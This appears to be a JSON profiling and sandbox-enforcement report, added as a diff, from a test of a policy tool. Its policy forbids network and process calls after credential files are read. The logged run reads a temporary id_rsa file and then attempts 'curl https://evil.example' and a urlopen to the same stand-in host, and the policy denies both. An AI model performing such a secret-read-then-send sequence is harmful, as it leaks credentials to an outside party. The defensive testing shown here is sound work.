@@ -1,0 +1,327 @@
+{
+  "wall_time_ms": 30.06,
+  "memory": {
+    "peak_kb": 132.46,
+    "current_kb": 0,
+    "top_allocations": [
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/values.py",
+        "line": 115,
+        "size_kb": 17.64,
+        "count": 193
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 302,
+        "size_kb": 5.25,
+        "count": 60
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 314,
+        "size_kb": 5.09,
+        "count": 50
+      },
+      {
+        "file": "/Users/cagatay/.local/share/uv/python/cpython-3.12.9-macos-aarch64-none/lib/python3.12/re/_compiler.py",
+        "line": 766,
+        "size_kb": 2.76,
+        "count": 7
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/temporal_eval.py",
+        "line": 206,
+        "size_kb": 2.12,
+        "count": 45
+      },
+      {
+        "file": "<frozen abc>",
+        "line": 123,
+        "size_kb": 2.08,
+        "count": 22
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 238,
+        "size_kb": 1.39,
+        "count": 31
+      },
+      {
+        "file": "/Users/cagatay/.local/share/uv/python/cpython-3.12.9-macos-aarch64-none/lib/python3.12/re/_parser.py",
+        "line": 548,
+        "size_kb": 0.88,
+        "count": 16
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 239,
+        "size_kb": 0.82,
+        "count": 7
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/inspect_schema.py",
+        "line": 93,
+        "size_kb": 0.78,
+        "count": 20
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 321,
+        "size_kb": 0.78,
+        "count": 20
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 320,
+        "size_kb": 0.78,
+        "count": 20
+      },
+      {
+        "file": "/Users/cagatay/.local/share/uv/python/cpython-3.12.9-macos-aarch64-none/lib/python3.12/threading.py",
+        "line": 293,
+        "size_kb": 0.74,
+        "count": 2
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/_decorator.py",
+        "line": 352,
+        "size_kb": 0.7,
+        "count": 20
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/_decorator.py",
+        "line": 589,
+        "size_kb": 0.69,
+        "count": 8
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 315,
+        "size_kb": 0.62,
+        "count": 20
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 301,
+        "size_kb": 0.62,
+        "count": 20
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 303,
+        "size_kb": 0.62,
+        "count": 10
+      },
+      {
+        "file": "/Users/cagatay/strands-inspect/strands_inspect/dogwood/bridge.py",
+        "line": 304,
+        "size_kb": 0.56,
+        "count": 9
+      },
+      {
+        "file": "/Users/cagatay/.local/share/uv/python/cpython-3.12.9-macos-aarch64-none/lib/python3.12/re/_parser.py",
+        "line": 450,
+        "size_kb": 0.54,
+        "count": 9
+      }
+    ]
+  },
+  "timeline": [
+    {
+      "time_ms": 0.0,
+      "current_kb": 3.9,
+      "peak_kb": 4.1
+    }
+  ],
+  "cpu": {
+    "total_calls": 0,
+    "top_functions": []
+  },
+  "gc": {},
+  "resource": {},
+  "stdout": "",
+  "stderr": "",
+  "return_value": null,
+  "exception": null,
+  "session": {
+    "session_id": "agent_20260930_154356",
+    "func_name": "agent",
+    "func_module": "__main__",
+    "timestamp": "2026-09-30T15:43:56.821703",
+    "policy": {
+      "language": "dogwood",
+      "name": "no_exfil.dw",
+      "source": "// no_exfil.dw -- allow everything, but once the function has read a credential-shaped\n// file (~/.ssh, ~/.aws, *.pem, .env ...) it may not reach the network or spawn a process\n// for the next five minutes. `Inspect::Action::\"net\"` and `\"os\"` are action groups.\n@id(\"allow-everything\")\npermit ( principal, action, resource );\n\n@id(\"no-exfil-after-secret\")\nforbid ( principal, action in [Inspect::Action::\"net\", Inspect::Action::\"os\"], resource )\nwhen temporal {\n    formerly within 5m Inspect::Action::\"file.read\"::request{ input.sensitive: true }\n};\n",
+      "rules": [
+        "allow-everything",
+        "no-exfil-after-secret"
+      ]
+    },
+    "source_code": "",
+    "syscalls": [
+      {
+        "timestamp": 1790797436825344000,
+        "action": "file.read",
+        "detail": "/etc/hosts (mode=r)",
+        "decision": "allow",
+        "duration_ns": 209000,
+        "result_preview": null,
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436827156000,
+        "action": "subprocess",
+        "detail": "ls /tmp",
+        "decision": "allow",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436827799000,
+        "action": "subprocess",
+        "detail": "ls /tmp",
+        "decision": "allow",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436834375000,
+        "action": "file.fd_io",
+        "detail": "os.read(fd=7, n=50000)",
+        "decision": "allow",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436844631000,
+        "action": "file.fd_io",
+        "detail": "os.read(fd=3, n=32768)",
+        "decision": "allow",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436845244000,
+        "action": "file.fd_io",
+        "detail": "os.read(fd=3, n=32768)",
+        "decision": "allow",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436845849000,
+        "action": "file.fd_io",
+        "detail": "os.read(fd=5, n=32768)",
+        "decision": "allow",
+        "duration_ns": 18831000,
+        "result_preview": "returncode=0",
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436846451000,
+        "action": "file.read",
+        "detail": "/var/folders/nt/_7cw350j3732__h0xtsnjmtm0000gq/T/tmpnru4zeq7/id_rsa (mode=r)",
+        "decision": "allow",
+        "duration_ns": 272000,
+        "result_preview": null,
+        "rules": [
+          "allow-everything"
+        ]
+      },
+      {
+        "timestamp": 1790797436847725000,
+        "action": "subprocess",
+        "detail": "curl https://evil.example",
+        "decision": "deny",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "no-exfil-after-secret"
+        ]
+      },
+      {
+        "timestamp": 1790797436852390000,
+        "action": "network",
+        "detail": "urlopen \u2192 https://evil.example",
+        "decision": "deny",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "no-exfil-after-secret"
+        ]
+      }
+    ],
+    "denied": [
+      {
+        "timestamp": 1790797436847725000,
+        "action": "subprocess",
+        "detail": "curl https://evil.example",
+        "decision": "deny",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "no-exfil-after-secret"
+        ]
+      },
+      {
+        "timestamp": 1790797436852390000,
+        "action": "network",
+        "detail": "urlopen \u2192 https://evil.example",
+        "decision": "deny",
+        "duration_ns": 0,
+        "result_preview": null,
+        "rules": [
+          "no-exfil-after-secret"
+        ]
+      }
+    ],
+    "stats": {
+      "files_read": 2,
+      "files_written": 0,
+      "files_deleted": 0,
+      "files_moved": 0,
+      "files_chmod": 0,
+      "network_calls": 1,
+      "subprocesses": 3,
+      "os_system_calls": 0,
+      "imports": 0,
+      "total_denied": 2
+    },
+    "details": {
+      "files_read": [
+        "/etc/hosts (mode=r)",
+        "/var/folders/nt/_7cw350j3732__h0xtsnjmtm0000gq/T/tmpnru4zeq7/id_rsa (mode=r)"
+      ],
+      "files_written": [],
+      "files_deleted": [],
+      "network_calls": [
+        "urlopen \u2192 https://evil.example"
+      ],
+      "subprocesses": [
+        "ls /tmp",
+        "ls /tmp",
+        "curl https://evil.example"
+      ],
+      "imports": []
+    }
+  }
+}
